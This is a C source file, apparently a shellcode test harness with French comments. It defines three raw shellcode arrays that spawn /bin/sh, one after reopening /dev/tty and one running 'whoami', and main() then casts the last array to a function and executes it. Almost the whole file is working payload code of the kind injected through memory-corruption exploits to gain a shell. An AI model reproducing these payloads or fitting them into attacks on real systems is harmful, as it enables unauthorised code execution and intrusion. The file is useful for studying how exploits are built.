#include <string.h>
#include <stdio.h>

int main(void)


{

	char shellcode32[] =
	"\x83\xc4\x18"
	"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
	"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
	"\x6a\x17\x58\x31\xdb\xcd\x80"																							//shellcode en x32 qui fonctionne avec -m32
	"\x6a\x2e\x58\x53\xcd\x80"
	"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

	char shellcode64[] = \
	"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
	"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x07\x00" //Shellcode en x64 fonctionne
	"\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x56\x57\x48\x89\xe6\x0f"
	"\x05";

	char shellcode64_2[] = "\x48\x31\xd2"                                  // xor    %rdx, %rdx
	"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
	"\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
	"\x53"                                          // push   %rbx
	"\x48\x89\xe7"                                  // mov    %rsp, %rdi
	"\x50"                                          // push   %rax												Fonctionne pour /bin/bash en x64
	"\x57"                                          // push   %rdi
	"\x48\x89\xe6"                                  // mov    %rsp, %rsi
	"\xb0\x3b"                                      // mov    $0x3b, %al
	"\x0f\x05";                                     // syscall


fprintf(stdout,"Length: %d\n",strlen(shellcode64_2));
 (*(void(*)()) shellcode64_2) ();

return 0;

    return 0;
}
